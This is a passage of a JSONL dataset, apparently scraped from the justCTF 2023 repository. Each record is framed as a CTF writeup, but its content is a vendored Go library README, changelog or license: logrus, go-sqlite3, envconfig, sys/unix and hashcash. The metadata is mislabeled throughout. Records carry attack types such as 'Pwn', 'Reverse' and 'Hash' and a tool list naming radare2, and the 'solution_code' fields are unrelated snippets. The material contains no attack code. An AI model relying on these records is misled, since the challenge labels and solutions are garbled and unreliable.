omg=true\ntime=\"2015-03-26T01:27:38-04:00\" level=debug msg=\"Temperature changes\" temperature=-4\ntime=\"2015-03-26T01:27:38-04:00\" level=panic msg=\"It's over 9000!\" animal=orca size=9009\ntime=\"2015-03-26T01:27:38-04:00\" level=fatal msg=\"The ice breaks!\" err=&{0x2082280c0 map[animal:orca size:9009] 2015-03-26 01:27:38.441574009 -0400 EDT panic It's over 9000!} number=100 omg=true\n```\nTo ensure this behaviour even if a TTY is attached, set your formatter as follows:\n\n```go\n\tlog.SetFormatter(&log.TextFormatter{\n\t\tDisableColors: true,\n\t\tFullTimestamp: true,\n\t})\n```\n\n#### Logging Method Name\n\nIf you wish to add the calling method as a field, instruct the logger via:\n```go\nlog.SetReportCaller(true)\n```\nThis adds the caller as 'method' like so:\n\n```json\n{\"animal\":\"penguin\",\"level\":\"fatal\",\"method\":\"github.com/sirupsen/arcticcreatures.migrate\",\"msg\":\"a penguin swims by\",\n\"time\":\"2014-03-10 19:57:38.562543129 -0400 EDT\"}\n```\n\n```text\ntime=\"2015-03-26T01:27:38-04:00\" level=fatal method=github.com/sirupsen/arcticcreatures.migrate msg=\"a penguin swims by\" animal=penguin\n```\nNote that this does add measurable overhead - the cost will depend on the version of Go, but is\nbetween 20 and 40% in recent tests with 1.6 and 1.7.  You can validate this in your\nenvir", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\web_perfectproduct\\private\\private\\manager\\vendor\\github.com\\sirupsen\\logrus\\README.md", "file_size": 19382, "scraped_at": "2025-10-26T18:20:51.338016"}
{"id": "justcatthefish_justctf-2023_Description", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Description", "attack_type": "Hash", "writeup": "go-sqlite3\n==========\n\n[![Go Reference](https://pkg.go.dev/badge/github.com/mattn/go-sqlite3.svg)](https://pkg.go.dev/github.com/mattn/go-sqlite3)\n[![GitHub Actions](https://github.com/mattn/go-sqlite3/workflows/Go/badge.svg)](https://github.com/mattn/go-sqlite3/actions?query=workflow%3AGo)\n[![Financial Contributors on Open Collective](https://opencollective.com/mattn-go-sqlite3/all/badge.svg?label=financial+contributors)](https://opencollective.com/mattn-go-sqlite3) \n[![codecov](https://codecov.io/gh/mattn/go-sqlite3/branch/master/graph/badge.svg)](https://codecov.io/gh/mattn/go-sqlite3)\n[![Go Report Card](https://goreportcard.com/badge/github.com/mattn/go-sqlite3)](https://goreportcard.com/report/github.com/mattn/go-sqlite3)\n\nLatest stable version is v1.14 or later, not v2.\n\n~~**NOTE:** The increase to v2 was an accident. There were no major changes or features.~~\n\n# Description\n\nA sqlite3 driver that conforms to the built-in database/sql interface.\n\nSupported Golang version: See [.github/workflows/go.yaml](./.github/workflows/go.yaml).\n\nThis package follows the official [Golang Release Policy](https://golang.org/doc/devel/release.html#policy).\n\n### Overview\n\n- [go-sqlite3](#go-sqlite3)\n- [Description](#description)\n    - [Overview](#overview)\n- [Installation](#installation)\n- [API Reference](#api-reference)\n- [Connection String](#connection-string)\n  - [DSN Examples](#dsn-examples)\n- [Features](#features)\n    - [Usage](#usage)\n    - [Feature / Extension List](#feature--extension-list)\n- [Compilation](#compilation)\n  - [Android](#android)\n- [ARM](#arm)\n- [Cross Compile](#cross-compile)\n- [Google Cloud Platform](#google-cloud-platform)\n  - [Linux](#linux)\n    - [Alpine](#alpine)\n    - [Fedora](#fedora)\n    - [Ubuntu](#ubuntu)\n  - [Mac OSX](#mac-osx)\n  - [Windows](#windows)\n  - [Errors](#errors)\n- [User Authentication](#user-authentication)\n  - [Compile](#compile)\n  - [Usage](#usage-1)\n    - [Create protected database](#create-protected-database)\n    - [Password Encoding](#password-encoding)\n      - [Available Encoders](#available-encoders)\n    - [Restrictions](#restrictions)\n    - [Support](#support)\n    - [User Management](#user-management)\n      - [SQL](#sql)\n        - [Examples](#examples)\n      - [*SQLiteConn](#sqliteconn)\n    - [Attached database](#attached-database)\n- [Extensions](#extensions)\n  - [Spatialite](#spatialite)\n- [FAQ](#faq)\n- [License](#license)\n- [Author](#author)\n\n# Installation\n\nThis package can be installed with the `go get` command:\n\n    go get github.com/mattn/go-sqlite3\n\n_go-sqlite3_ is *cgo* package.\nIf you want to build your app using go-sqlite3, you need gcc.\nHowever, after you have built and installed _go-sqlite3_ with `go install github.com/mattn/go-sqlite3` (which requires gcc), you can build your app without relying on gcc in future.\n\n***Important: because this is a `CGO` enabled package, you are required to set the environment variable `CGO_ENABLED=1` and have a `gcc` compile present within your path.***\n\n# API Reference\n\nAPI documentation can be found [here](http://godoc.org/github.com/mattn/go-sqlite3).\n\nExamples can be found under the [examples](./_example) directory.\n\n# Connection String\n\nWhen creating a new SQLite database or connection to an existing one, with the file name additional options can be given.\nThis is also known as a DSN (Data Source Name) string.\n\nOptions are append after the filename of the SQLite database.\nThe database filename and options are separated by an `?` (Question Mark).\nOptions should be URL-encoded (see [url.QueryEscape](https://golang.org/pkg/net/url/#QueryEscape)).\n\nThis also applies when using an in-memory database instead of a file.\n\nOptions can be given using the following format: `KEYWORD=VALUE` and multiple options can be combined with the `&` ampersand.\n\nThis library supports DSN options of SQLite itself and provides additional options.\n\nBoolean values can be one of:\n* `0` `no` `false` `off`\n* `1` `yes` `true` `on`\n\n| Name | Key | Value(s) | Description |\n|------|-----|----------|-------------|\n| UA - Create | `_auth` | - | Create User Authentication, for more information see [User Authentication](#user-authentication) |\n| UA - Username | `_auth_user` | `string` | Username for User Authentication, for more information see [User Authentication](#user-authentication) |\n| UA - Password | `_auth_pass` | `string` | Password for User Authentication, for more information see [User Authentication](#user-authentication) |\n| UA - Crypt | `_auth_crypt` | <ul><li>SHA1</li><li>SSHA1</li><li>SHA256</li><li>SSHA256</li><li>SHA384</li><li>SSHA384</li><li>SHA512</li><li>SSHA512</li></ul> | Password encoder to use for User Authentication, for more information see [User Authentication](#user-authentication) |\n| UA - Salt | `_auth_salt` | `string` | Salt to use if the configure password encoder requires a salt, for User Authentication, for more information see [User Authentication](#user-authentication) |\n| Auto Vacuum | `_auto_vacuum` \\| `_vacuum` | <", "solution_code": "    Remove the download repository from your disk and try re-install with:\n", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\web_perfectproduct\\private\\private\\manager\\vendor\\github.com\\mattn\\go-sqlite3\\README.md", "file_size": 29900, "scraped_at": "2025-10-26T18:20:51.366440"}
{"id": "justcatthefish_justctf-2023_envconfig", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "envconfig", "attack_type": "Misc", "writeup": "# envconfig\n\n[![Build Status](https://travis-ci.org/kelseyhightower/envconfig.svg)](https://travis-ci.org/kelseyhightower/envconfig)\n\n```Go\nimport \"github.com/kelseyhightower/envconfig\"\n```\n\n## Documentation\n\nSee [godoc](http://godoc.org/github.com/kelseyhightower/envconfig)\n\n## Usage\n\nSet some environment variables:\n\n```Bash\nexport MYAPP_DEBUG=false\nexport MYAPP_PORT=8080\nexport MYAPP_USER=Kelsey\nexport MYAPP_RATE=\"0.5\"\nexport MYAPP_TIMEOUT=\"3m\"\nexport MYAPP_USERS=\"rob,ken,robert\"\nexport MYAPP_COLORCODES=\"red:1,green:2,blue:3\"\n```\n\nWrite some code:\n\n```Go\npackage main\n\nimport (\n    \"fmt\"\n    \"log\"\n    \"time\"\n\n    \"github.com/kelseyhightower/envconfig\"\n)\n\ntype Specification struct {\n    Debug       bool\n    Port        int\n    User        string\n    Users       []string\n    Rate        float32\n    Timeout     time.Duration\n    ColorCodes  map[string]int\n}\n\nfunc main() {\n    var s Specification\n    err := envconfig.Process(\"myapp\", &s)\n    if err != nil {\n        log.Fatal(err.Error())\n    }\n    format := \"Debug: %v\\nPort: %d\\nUser: %s\\nRate: %f\\nTimeout: %s\\n\"\n    _, err = fmt.Printf(format, s.Debug, s.Port, s.User, s.Rate, s.Timeout)\n    if err != nil {\n        log.Fatal(err.Error())\n    }\n\n    fmt.Println(\"Users:\")\n    for _, u := range s.Users {\n        fmt.Printf(\"  %s\\n\", u)\n    }\n\n    fmt.Println(\"Color codes:\")\n    for k, v := range s.ColorCodes {\n        fmt.Printf(\"  %s: %d\\n\", k, v)\n    }\n}\n```\n\nResults:\n\n```Bash\nDebug: false\nPort: 8080\nUser: Kelsey\nRate: 0.500000\nTimeout: 3m0s\nUsers:\n  rob\n  ken\n  robert\nColor codes:\n  red: 1\n  green: 2\n  blue: 3\n```\n\n## Struct Tag Support\n\nEnvconfig supports the use of struct tags to specify alternate, default, and required\nenvironment variables.\n\nFor example, consider the following struct:\n\n```Go\ntype Specification struct {\n    ManualOverride1 string `envconfig:\"manual_override_1\"`\n    DefaultVar      string `default:\"foobar\"`\n    RequiredVar     string `required:\"true\"`\n    IgnoredVar      string `ignored:\"true\"`\n    AutoSplitVar    string `split_words:\"true\"`\n    RequiredAndAutoSplitVar    string `required:\"true\" split_words:\"true\"`\n}\n```\n\nEnvconfig has automatic support for CamelCased struct elements when the\n`split_words:\"true\"` tag is supplied. Without this tag, `AutoSplitVar` above\nwould look for an environment variable called `MYAPP_AUTOSPLITVAR`. With the\nsetting applied it will look for `MYAPP_AUTO_SPLIT_VAR`. Note that numbers\nwill get globbed into the previous word. If the setting does not do the\nright thing, you may use a manual override.\n\nEnvconfig will process value for `ManualOverride1` by populating it with the\nvalue for `MYAPP_MANUAL_OVERRIDE_1`. Without this struct tag, it would have\ninstead looked up `MYAPP_MANUALOVERRIDE1`. With the `split_words:\"true\"` tag\nit would have looked up `MYAPP_MANUAL_OVERRIDE1`.\n\n```Bash\nexport MYAPP_MANUAL_OVERRIDE_1=\"this will be the value\"\n\n# export MYAPP_MANUALOVERRIDE1=\"and this will not\"\n```\n\nIf envconfig can't find an environment variable value for `MYAPP_DEFAULTVAR`,\nit will populate it with \"foobar\" as a default value.\n\nIf envconfig can't find an environment variable value for `MYAPP_REQUIREDVAR`,\nit will return an error when asked to process the struct.  If\n`MYAPP_REQUIREDVAR` is present but empty, envconfig will not return an error.\n\nIf envconfig can't find an environment variable in the form `PREFIX_MYVAR`, and there\nis a struct tag defined, it will try to populate your variable with an environment\nvariable that directly matches the envconfig tag in your struct definition:\n\n```shell\nexport SERVICE_HOST=127.0.0.1\nexport MYAPP_DEBUG=true\n```\n```Go\ntype Specification struct {\n    ServiceHost string `envconfig:\"SERVICE_HOST\"`\n    Debug       bool\n}\n```\n\nEnvconfig won't process a field with the \"ignored\" tag set to \"true\", even if a corresponding\nenvironment variable is set.\n\n## Supported Struct Field Types\n\nenvconfig supports these struct field types:\n\n  * string\n  * int8, int16, int32, int64\n  * bool\n  * float32, float64\n  * slices of any supported type\n  * maps (keys and values of any supported type)\n  * [encoding.TextUnmarshaler](https://golang.org/pkg/encoding/#TextUnmarshaler)\n  * [encoding.BinaryUnmarshaler](https://golang.org/pkg/encoding/#BinaryUnmarshaler)\n  * [time.Duration](https://golang.org/pkg/time/#Duration)\n\nEmbedded structs using these fields are also supported.\n\n## Custom Decoders\n\nAny field whose type (or pointer-to-type) implements `envconfig.Decoder` can\ncontrol its own deserialization:\n\n```Bash\nexport DNS_SERVER=8.8.8.8\n```\n\n```Go\ntype IPDecoder net.IP\n\nfunc (ipd *IPDecoder) Decode(value string) error {\n    *ipd = IPDecoder(net.ParseIP(value))\n    return nil\n}\n\ntype DNSConfig struct {\n    Address IPDecoder `envconfig:\"DNS_SERVER\"`\n}\n```\n\nAlso, envconfig will use a `Set(string) error` method like from the\n[flag.Value](https://godoc.org/flag#Value) interface if implemented.\n", "solution_code": "    var s Specification\n    err := envconfig.Process(\"myapp\", &s)\n    if err != nil {\n        log.Fatal(err.Error())\n    }\n    format := \"Debug: %v\\nPort: %d\\nUser: %s\\nRate: %f\\nTimeout: %s\\n\"\n    _, err = fmt.Printf(format, s.Debug, s.Port, s.User, s.Rate, s.Timeout)\n    if err != nil {\n        log.Fatal(err.Error())\n    }\n\n\n    fmt.Println(\"Users:\")\n    for _, u := range s.Users {\n        fmt.Printf(\"  %s\\n\", u)\n    }\n\n\n    fmt.Println(\"Color codes:\")\n    for k, v := range s.ColorCodes {\n        fmt.Printf(\"  %s: %d\\n\", k, v)\n    }\n", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\web_perfectproduct\\private\\private\\manager\\vendor\\github.com\\kelseyhightower\\envconfig\\README.md", "file_size": 4886, "scraped_at": "2025-10-26T18:20:51.386714"}
{"id": "justcatthefish_justctf-2023_Building_`sys_unix`", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Building `sys/unix`", "attack_type": "Pwn", "writeup": "# Building `sys/unix`\n\nThe sys/unix package provides access to the raw system call interface of the\nunderlying operating system. See: https://godoc.org/golang.org/x/sys/unix\n\nPorting Go to a new architecture/OS combination or adding syscalls, types, or\nconstants to an existing architecture/OS pair requires some manual effort;\nhowever, there are tools that automate much of the process.\n\n## Build Systems\n\nThere are currently two ways we generate the necessary files. We are currently\nmigrating the build system to use containers so the builds are reproducible.\nThis is being done on an OS-by-OS basis. Please update this documentation as\ncomponents of the build system change.\n\n### Old Build System (currently for `GOOS != \"linux\"`)\n\nThe old build system generates the Go files based on the C header files\npresent on your system. This means that files\nfor a given GOOS/GOARCH pair must be generated on a system with that OS and\narchitecture. This also means that the generated code can differ from system\nto system, based on differences in the header files.\n\nTo avoid this, if you are using the old build system, only generate the Go\nfiles on an installation with unmodified header files. It is also important to\nkeep track of which version of the OS the files were generated from (ex.\nDarwin 14 vs Darwin 15). This makes it easier to track the progress of changes\nand have each OS upgrade correspond to a single change.\n\nTo build the files for your current OS and architecture, make sure GOOS and\nGOARCH are set correctly and run `mkall.sh`. This will generate the files for\nyour specific system. Running `mkall.sh -n` shows the commands that will be run.\n\nRequirements: bash, go\n\n### New Build System (currently for `GOOS == \"linux\"`)\n\nThe new build system uses a Docker container to generate the go files directly\nfrom source checkouts of the kernel and various system libraries. This means\nthat on any platform that supports Docker, all the files using the new build\nsystem can be generated at once, and generated files will not change based on\nwhat the person running the scripts has installed on their computer.\n\nThe OS specific files for the new build system are located in the `${GOOS}`\ndirectory, and the build is coordinated by the `${GOOS}/mkall.go` program. When\nthe kernel or system library updates, modify the Dockerfile at\n`${GOOS}/Dockerfile` to checkout the new release of the source.\n\nTo build all the files under the new build system, you must be on an amd64/Linux\nsystem and have your GOOS and GOARCH set accordingly. Running `mkall.sh` will\nthen generate all of the files for all of the GOOS/GOARCH pairs in the new build\nsystem. Running `mkall.sh -n` shows the commands that will be run.\n\nRequirements: bash, go, docker\n\n## Component files\n\nThis section describes the various files used in the code generation process.\nIt also contains instructions on how to modify these files to add a new\narchitecture/OS or to add additional syscalls, types, or constants. Note that\nif you are using the new build system, the scripts/programs cannot be called normally.\nThey must be called from within the docker container.\n\n### asm files\n\nThe hand-written assembly file at `asm_${GOOS}_${GOARCH}.s` implements system\ncall dispatch. There are three entry points:\n```\n  func Syscall(trap, a1, a2, a3 uintptr) (r1, r2, err uintptr)\n  func Syscall6(trap, a1, a2, a3, a4, a5, a6 uintptr) (r1, r2, err uintptr)\n  func RawSyscall(trap, a1, a2, a3 uintptr) (r1, r2, err uintptr)\n```\nThe first and second are the standard ones; they differ only in how many\narguments can be passed to the kernel. The third is for low-level use by the\nForkExec wrapper. Unlike the first two, it does not call into the scheduler to\nlet it know that a system call is running.\n\nWhen porting Go to a new architecture/OS, this file must be implemented for\neach GOOS/GOARCH pair.\n\n### mksysnum\n\nMksysnum is a Go program located at `${GOOS}/mksysnum.go` (or `mksysnum_${GOOS}.go`\nfor the old system). This program takes in a list of header files containing the\nsyscall number declarations and parses them to produce the corresponding list of\nGo numeric constants. See `zsysnum_${GOOS}_${GOARCH}.go` for the generated\nconstants.\n\nAdding new syscall numbers is mostly done by running the build on a sufficiently\nnew installation of the target OS (or updating the source checkouts for the\nnew build system). However, depending on the OS, you may need to update the\nparsing in mksysnum.\n\n### mksyscall.go\n\nThe `syscall.go`, `syscall_${GOOS}.go`, `syscall_${GOOS}_${GOARCH}.go` are\nhand-written Go files which implement system calls (for unix, the specific OS,\nor the specific OS/Architecture pair respectively) that need special handling\nand list `//sys` comments giving prototypes for ones that can be generated.\n\nThe mksyscall.go program takes the `//sys` and `//sysnb` comments and converts\nthem into syscalls. This requires the name of the prototype in the comment to\nmatch a syscall number in the `zsysnum_${GOOS}_${GOARCH", "solution_code": "", "tools": ["radare2"], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\web_mongodb2\\private\\private\\manager\\vendor\\golang.org\\x\\sys\\unix\\README.md", "file_size": 8685, "scraped_at": "2025-10-26T18:20:51.404079"}
{"id": "justcatthefish_justctf-2023_Change_Log", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Change Log", "attack_type": "Unknown", "writeup": "# Change Log\nAll notable changes to this project will be documented in this file.\nThis project adheres to [Semantic Versioning](http://semver.org/).\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\web_mongodb2\\private\\private\\manager\\vendor\\github.com\\umahmood\\hashcash\\CHANGELOG.md", "file_size": 149, "scraped_at": "2025-10-26T18:20:51.405787"}
{"id": "justcatthefish_justctf-2023_LICENSE", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "LICENSE", "attack_type": "Unknown", "writeup": "The MIT License (MIT)\n\nCopyright (c) 2015 Usman Mahmood\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\web_mongodb2\\private\\private\\manager\\vendor\\github.com\\umahmood\\hashcash\\LICENSE.md", "file_size": 1081, "scraped_at": "2025-10-26T18:20:51.407707"}
{"id": "justcatthefish_justctf-2023_Hashcash", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Hashcash", "attack_type": "Reverse", "writeup": "# Hashcash\n\nHashcash is a Go library which implements the hashcash algorithm. Hashcash is a \nproof-of-work algorithm, which has been used as a denial-of-service counter \nmeasure technique in a number of systems. To learn more about hashcash, \ngo [here](http://hashcash.org/).\n\n# Installation\n\n> go get github.com/umahmood/hashcash\n\n# Usage\n\nComputing a hashcash:\n```\npackage main\n\nimport (\n    \"fmt\"\n    \n    \"github.com/umahmood/hashcash\"\n)\n\nfunc validateResource(resource string) bool {\n    // validate resource. resource could be an email, ip \n    // address, etc... so for an email we could check it \n    // exists in the database.\n    return true\n}\n\nfunc main() {\n    hc, err := hashcash.New(\n        &hashcash.Resource{\n            Data:          \"someone@gmail.com\",\n            ValidatorFunc: validateResource,\n        },\n        nil, // use default config.\n    )\n    if err != nil {\n        // handle error\n    }\n    \n    solution, err := hc.Compute()\n    if err != nil {\n        if err != hashcash.ErrSolutionFail {\n            // did not find a solution, can call compute again.\n        }\n    } \n    fmt.Println(solution)\n}\n```\nOutput:\n```\n1:20:040806:foo::65f460d0726f420d:13a6b8\n```\n```\n$ echo -n \"1:20:040806:foo::65f460d0726f420d:13a6b8\" | shasum\n00000f91d51a9c213f9b7420c35c62b5e818c23e\n```\nVerifying a hashcash:\n```\nvalid, err := hc.Verify(solution)\nif err != nil {\n    // handle error\n}\nif !valid {\n   // hashcash token failed verification.\n}\n```\nStorage:\n\nIn order to detect double spending, hashcash stores verified hashcash tokens in \na sqlite3 database. This database is stored in ~/.hashcash/spent.db.\n\nIf you would like to change the underlying storage (i.e. to an in memory hash \ntable) or location. You will need to build a type which satisfies the *Storage* \ninterface.\n\n# To Do\n\n- Allow entries in default storage (sqlite3 database) to be purged.\n\n# Documentation\n\nhttp://godoc.org/github.com/umahmood/hashcash\n\n# License\n\nSee the [LICENSE](LICENSE.md) file for license rights and limitations (MIT).\n", "solution_code": "    solution, err := hc.Compute()\n    if err != nil {\n        if err != hashcash.ErrSolutionFail {\n            // did not find a solution, can call compute again.\n        }\n    } \n    fmt.Println(solution)\n", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\web_mongodb2\\private\\private\\manager\\vendor\\github.com\\umahmood\\hashcash\\README.md", "file_size": 2028, "scraped_at": "2025-10-26T18:20:51.409704"}
{"id": "justcatthefish_justctf-2023_1.8.1", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "1.8.1", "attack_type": "Misc", "writeup": "# 1.8.1\nCode quality:\n  * move magefile in its own subdir/submodule to remove magefile dependency on logrus consumer\n  * improve timestamp format documentation\n\nFixes:\n  * fix race condition on logger hooks\n\n\n# 1.8.0\n\nCorrect versioning number replacing v1.7.1.\n\n# 1.7.1\n\nBeware this release has introduced a new public API and its semver is therefore incorrect.\n\nCode quality:\n  * use go 1.15 in travis\n  * use magefile as task runner\n\nFixes:\n  * small fixes about new go 1.13 error formatting system\n  * Fix for long time race condiction with mutating data hooks\n\nFeatures:\n  * build support for zos\n\n# 1.7.0\nFixes:\n  * the dependency toward a windows terminal library has been removed\n\nFeatures:\n  * a new buffer pool management API has been added\n  * a set of `<LogLevel>Fn()` functions have been added\n\n# 1.6.0\nFixes:\n  * end of line cleanup\n  * revert the entry concurrency bug fix whic leads to deadlock under some circumstances\n  * update dependency on go-windows-terminal-sequences to fix a crash with go 1.14\n\nFeatures:\n  * add an option to the `TextFormatter` to completely disable fields quoting\n\n# 1.5.0\nCode quality:\n  * add golangci linter run on travis\n\nFixes:\n  * add mutex for hooks concurrent access on `Entry` data\n  * caller function field for go1.14\n  * fix build issue for gopherjs target\n\nFeature:\n  * add an hooks/writer sub-package whose goal is to split output on different stream depending on the trace level\n  * add a `DisableHTMLEscape` option in the `JSONFormatter`\n  * add `ForceQuote` and `PadLevelText` options in the `TextFormatter`\n\n# 1.4.2\n  * Fixes build break for plan9, nacl, solaris\n# 1.4.1\nThis new release introduces:\n  * Enhance TextFormatter to not print caller information when they are empty (#944)\n  * Remove dependency on golang.org/x/crypto (#932, #943)\n\nFixes:\n  * Fix Entry.WithContext method to return a copy of the initial entry (#941)\n\n# 1.4.0\nThis new release introduces:\n  * Add `DeferExitHandler`, similar to `RegisterExitHandler` but prepending the handler to the list of handlers (semantically like `defer`) (#848).\n  * Add `CallerPrettyfier` to `JSONFormatter` and `TextFormatter` (#909, #911)\n  * Add `Entry.WithContext()` and `Entry.Context`, to set a context on entries to be used e.g. in hooks (#919).\n\nFixes:\n  * Fix wrong method calls `Logger.Print` and `Logger.Warningln` (#893).\n  * Update `Entry.Logf` to not do string formatting unless the log level is enabled (#903)\n  * Fix infinite recursion on unknown `Level.String()` (#907)\n  * Fix race condition in `getCaller` (#916).\n\n\n# 1.3.0\nThis new release introduces:\n  * Log, Logf, Logln functions for Logger and Entry that take a Level\n\nFixes:\n  * Building prometheus node_exporter on AIX (#840)\n  * Race condition in TextFormatter (#468)\n  * Travis CI import path (#868)\n  * Remove coloured output on Windows (#862)\n  * Pointer to func as field in JSONFormatter (#870)\n  * Properly marshal Levels (#873)\n\n# 1.2.0\nThis new release introduces:\n  * A new method `SetReportCaller` in the `Logger` to enable the file, line and calling function from which the trace has been issued\n  * A new trace level named `Trace` whose level is below `Debug`\n  * A configurable exit function to be called upon a Fatal trace\n  * The `Level` object now implements `encoding.TextUnmarshaler` interface\n\n# 1.1.1\nThis is a bug fix release.\n  * fix the build break on Solaris\n  * don't drop a whole trace in JSONFormatter when a field param is a function pointer which can not be serialized\n\n# 1.1.0\nThis new release introduces:\n  * several fixes:\n    * a fix for a race condition on entry formatting\n    * proper cleanup of previously used entries before putting them back in the pool\n    * the extra new line at the end of message in text formatter has been removed\n  * a new global public API to check if a level is activated: IsLevelEnabled\n  * the following methods have been added to the Logger object\n    * IsLevelEnabled\n    * SetFormatter\n    * SetOutput\n    * ReplaceHooks\n  * introduction of go module\n  * an indent configuration for the json formatter\n  * output colour support for windows\n  * the field sort function is now configurable for text formatter\n  * the CLICOLOR and CLICOLOR\\_FORCE environment variable support in text formater\n\n# 1.0.6\n\nThis new release introduces:\n  * a new api WithTime which allows to easily force the time of the log entry\n    which is mostly useful for logger wrapper\n  * a fix reverting the immutability of the entry given as parameter to the hooks\n    a new configuration field of the json formatter in order to put all the fields\n    in a nested dictionnary\n  * a new SetOutput method in the Logger\n  * a new configuration of the textformatter to configure the name of the default keys\n  * a new configuration of the text formatter to disable the level truncation\n\n# 1.0.5\n\n* Fix hooks race (#707)\n* Fix panic deadlock (#695)\n\n# 1.0.4\n\n* Fix race when adding hooks (#612)\n* Fix terminal check in AppEngine (#635)\n\n# 1.0.3\n\n* Replace example files with t", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\web_mongodb2\\private\\private\\manager\\vendor\\github.com\\sirupsen\\logrus\\CHANGELOG.md", "file_size": 7470, "scraped_at": "2025-10-26T18:20:51.415110"}
{"id": "justcatthefish_justctf-2023_Logrus_<img_src=\"http:__i.imgur.com_hTeVwmJ.png\"_width=\"40\"_height=\"40\"_alt=\":walrus:\"_class=\"emoji\"_title=\":walrus:\"_>_[![Build_Status](https:__github.com_sirupsen_logrus_workflows_CI_badge.svg)](https:__github.com_sirupsen_logrus_actions?query=workflow%3ACI)_[![Build_Status](https:__travis-ci.org_sirupsen_logrus.svg?branch=master)](https:__travis-ci.org_sirupsen_logrus)_[![Go_Reference](https:__pkg.go.dev_badge_github.com_sirupsen_logrus.svg)](https:__pkg.go.dev_github.com_sirupsen_logrus)", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Logrus <img src=\"http://i.imgur.com/hTeVwmJ.png\" width=\"40\" height=\"40\" alt=\":walrus:\" class=\"emoji\" title=\":walrus:\"/> [![Build Status](https://github.com/sirupsen/logrus/workflows/CI/badge.svg)](https://github.com/sirupsen/logrus/actions?query=workflow%3ACI) [![Build Status](https://travis-ci.org/sirupsen/logrus.svg?branch=master)](https://travis-ci.org/sirupsen/logrus) [![Go Reference](https://pkg.go.dev/badge/github.com/sirupsen/logrus.svg)](https://pkg.go.dev/github.com/sirupsen/logrus)", "attack_type": "Reverse", "writeup": "# Logrus <img src=\"http://i.imgur.com/hTeVwmJ.png\" width=\"40\" height=\"40\" alt=\":walrus:\" class=\"emoji\" title=\":walrus:\"/> [![Build Status](https://github.com/sirupsen/logrus/workflows/CI/badge.svg)](https://github.com/sirupsen/logrus/actions?query=workflow%3ACI) [![Build Status](https://travis-ci.org/sirupsen/logrus.svg?branch=master)](https://travis-ci.org/sirupsen/logrus) [![Go Reference](https://pkg.go.dev/badge/github.com/sirupsen/logrus.svg)](https://pkg.go.dev/github.com/sirupsen/logrus)\n\nLogrus is a structured logger for Go (golang), completely API compatible with\nthe standard library logger.\n\n**Logrus is in maintenance-mode.** We will not be introducing new features. It's\nsimply too hard to do in a way that won't break many people's projects, which is\nthe last thing you want from your Logging library (again...).\n\nThis does not mean Logrus is dead. Logrus will continue to be maintained for\nsecurity, (backwards compatible) bug fixes, and performance (where we are\nlimited by the interface). \n\nI believe Logrus' biggest contribution is to have played a part in today's\nwidespread use of structured logging in Golang. There doesn't seem to be a\nreason to do a major, breaking iteration into Logrus V2, since the fantastic Go\ncommunity has built those independently. Many fantastic alternatives have sprung\nup. Logrus would look like those, had it been re-designed with what we know\nabout structured logging in Go today. Check out, for example,\n[Zerolog][zerolog], [Zap][zap], and [Apex][apex].\n\n[zerolog]: https://github.com/rs/zerolog\n[zap]: https://github.com/uber-go/zap\n[apex]: https://github.com/apex/log\n\n**Seeing weird case-sensitive problems?** It's in the past been possible to\nimport Logrus as both upper- and lower-case. Due to the Go package environment,\nthis caused issues in the community and we needed a standard. Some environments\nexperienced problems with the upper-case variant, so the lower-case was decided.\nEverything using `logrus` will need to use the lower-case:\n`github.com/sirupsen/logrus`. Any package that isn't, should be changed.\n\nTo fix Glide, see [these\ncomments](https://github.com/sirupsen/logrus/issues/553#issuecomment-306591437).\nFor an in-depth explanation of the casing issue, see [this\ncomment](https://github.com/sirupsen/logrus/issues/570#issuecomment-313933276).\n\nNicely color-coded in development (when a TTY is attached, otherwise just\nplain text):\n\n![Colored](http://i.imgur.com/PY7qMwd.png)\n\nWith `log.SetFormatter(&log.JSONFormatter{})`, for easy parsing by logstash\nor Splunk:\n\n```json\n{\"animal\":\"walrus\",\"level\":\"info\",\"msg\":\"A group of walrus emerges from the\nocean\",\"size\":10,\"time\":\"2014-03-10 19:57:38.562264131 -0400 EDT\"}\n\n{\"level\":\"warning\",\"msg\":\"The group's number increased tremendously!\",\n\"number\":122,\"omg\":true,\"time\":\"2014-03-10 19:57:38.562471297 -0400 EDT\"}\n\n{\"animal\":\"walrus\",\"level\":\"info\",\"msg\":\"A giant walrus appears!\",\n\"size\":10,\"time\":\"2014-03-10 19:57:38.562500591 -0400 EDT\"}\n\n{\"animal\":\"walrus\",\"level\":\"info\",\"msg\":\"Tremendously sized cow enters the ocean.\",\n\"size\":9,\"time\":\"2014-03-10 19:57:38.562527896 -0400 